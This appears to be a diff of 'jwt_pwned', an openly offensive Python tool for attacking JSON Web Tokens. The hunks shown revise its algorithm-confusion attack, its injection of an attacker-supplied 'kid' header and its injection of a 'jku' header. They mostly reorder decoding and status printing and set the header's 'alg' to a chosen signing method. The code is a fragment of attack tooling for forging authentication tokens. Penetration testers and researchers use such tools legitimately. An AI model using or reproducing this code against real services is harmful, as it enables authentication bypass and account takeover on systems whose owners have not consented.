@@ -3,7 +3,7 @@
 # jwt_pwned version 1.0.0 (06_10_2021)
 # Written by Gustavo Segundo (@Bytenull%00)
 # Please use responsibly...
-# Software URL: https://github.com/Bytenull00/jwt_pwned/blob/main/jwt_pwned.py
+# Software URL: https://github.com/X
 # Contact: gasso2do@gmail.com
 
 from colorama import init, Fore, Back, Style
@@ -148,10 +148,16 @@ elif args.command == 'konfusion':
 	headers, payload, sign = token.split('.')
 	headers = urlsafe_b64decode(headers + '=' * (4 - len(headers) % 4)).decode()
 	headers	= json.loads(headers)
-	payload = urlsafe_b64decode(payload + '=' * (4 - len(payload) % 4)).decode()
 
 	print(Fore.YELLOW+"\n[i] Attack confusion algorithm")
 	print(Fore.BLUE+f"\n[*] Decoded Header value: {Fore.WHITE}{json.dumps(headers)}")
+
+	payload = urlsafe_b64decode(payload + '=' * (4 - len(payload) % 4)).decode()
+
+	headers_new = headers
+	headers_new['alg'] = args.sign.upper()
+
+	print(Fore.BLUE+f"[*] New Decoded Header value: {Fore.WHITE}{json.dumps(headers_new)}")
 	print(Fore.BLUE+f"[*] Decoded Payload value: {Fore.WHITE}{payload}")
 	modify_response = input(f"{Fore.MAGENTA}[>] Modify Payload? [y/N]: "+Fore.WHITE)
 	if modify_response.lower() == 'y':
@@ -198,7 +204,7 @@ elif args.command == 'kid':
 	headers['alg'] = args.sign.upper()
 	headers['kid'] = args.injection
 
-	print(Fore.YELLOW+"\n[i] Attack KID Header")
+	print(Fore.YELLOW+"\n[i] Attack kid Header")
 	print(Fore.BLUE+f"\n[*] New Decoded Header value: {Fore.WHITE}{json.dumps(headers)}")
 	headers.pop('alg',None)
 
@@ -242,14 +248,14 @@ elif args.command == 'jku':
 	token = args.token
 	headers, payload, sign = token.split('.')
 	headers = urlsafe_b64decode(headers + '=' * (4 - len(headers) % 4)).decode()
-	
-	headers	= json.loads(headers)
-	headers['jku'] = args.injection
 
+	headers	= json.loads(headers)
 	print(Fore.YELLOW+"\n[i] Attack jku Header")
+	print(Fore.BLUE+f"\n[*] Decoded Header value: {Fore.WHITE}{json.dumps(headers)}")
+	headers['jku'] = args.injection
+	
 	print(Fore.BLUE+f"[*] New Decoded Header value: {Fore.WHITE}{json.dumps(headers)}")
 	
-
 	payload = urlsafe_b64decode(payload + '=' * (4 - len(payload) % 4)).decode()
 	print(Fore.BLUE+f"[*] Decoded Payload value: {Fore.WHITE}{payload}")
 	modify_response = input(f"{Fore.MAGENTA}[>] Modify Payload? [y/N]: "+Fore.WHITE)
